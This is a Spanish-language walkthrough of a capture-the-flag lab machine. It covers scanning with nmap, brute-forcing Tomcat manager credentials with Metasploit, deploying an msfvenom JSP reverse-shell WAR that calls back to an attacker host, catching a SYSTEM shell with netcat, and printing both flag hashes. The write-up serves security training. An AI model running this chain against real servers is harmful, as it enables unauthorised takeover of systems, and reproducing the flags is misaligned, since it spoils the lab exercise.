
![[ 20250706131558.png]](jerry-images/20250706131558.png)
# NMAP

Realizamos un escaneo básico de nmap para ver los puertos abiertos

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.197.30 -oN scanner
```

![[ 20250706125044.png]]

una vez identificados los puertos abiertos vamos a realizar un escáner con scripts básicos para ver servicios y versiones

```bash
nmap -p8080 -sCV 10.129.197.30 -oN targeted
```

![[ 20250706125221.png]]

# Puerto 8080

entramos en la pagina web para ver que encontramos

![[ 20250706125423.png]]

despues de explorarla un poco vemos que en la parte de `manager app` aparece una solicitud de credenciales

![[ 20250706125702.png]]

## metasploit

abrimos metasploit

```bash
msfdb run
```


utilizamos el payload

```bash
use auxiliary/scanner/http/tomcat_mgr_login
```

![[ 20250706125927.png]]

cambiamos el RHOTS 

```bash
set RHOSTS 10.129.197.30
```

cambiamos el USERNAME

```bash
set USERNAME tomcat
```

y lanzamos el exploit

```bash
run
```

![[ 20250706130135.png]]

vemos el usuario y contraseña tomcat:s3cret

al ingresarlo en la pagina web accedemos al menú de manager 

![[ 20250706130238.png]]

en este manu vemos que podemos subir un archivo .war

## msfvenom

asi que creamos un payload malicioso

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.155 LPORT=1234 -f war >> pwned.war
```

subimos el payload con la shell en la pagina web

![[ 20250706130648.png]]

pulsamos deploy 

![[ 20250706130727.png]]

y vemos un mensaje que indica que el archivo se subió correctamente 

# Abuso de payload

nos ponemos en escucha en el puerto indicado en mi caso el 1234

```bash
nc -nlvp 1234
```

y en la url ponemos 

```bash
<IP VICTIMA>:8080/NOMBRE_PAYLAOD
```

```bash
10.129.197.30:8080/pwned
```

la pagina web quedara en blanco y por la terminal en escucha vemos lo siguiente

![[ 20250706131056.png]]

se ha estabecido conexion con la maquina victima 

![[ 20250706131117.png]]

y tenemos usuario system = administrador 

# flags

explorando el sistema llegamos al directorio `C:\Users\Administrator\Desktop\flags` donde encontramos un archivo con nombre `2 for the price of 1.txt`

utilizamos type para ver el archivo (dato importante como es un sistema windows y el nombre del archivo tiene espacios debemos ponerlo entre comillas "nombre de archivo" para que el sistema lo detecte)

![[ 20250706131329.png]]

y tenemos ambas flags

user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
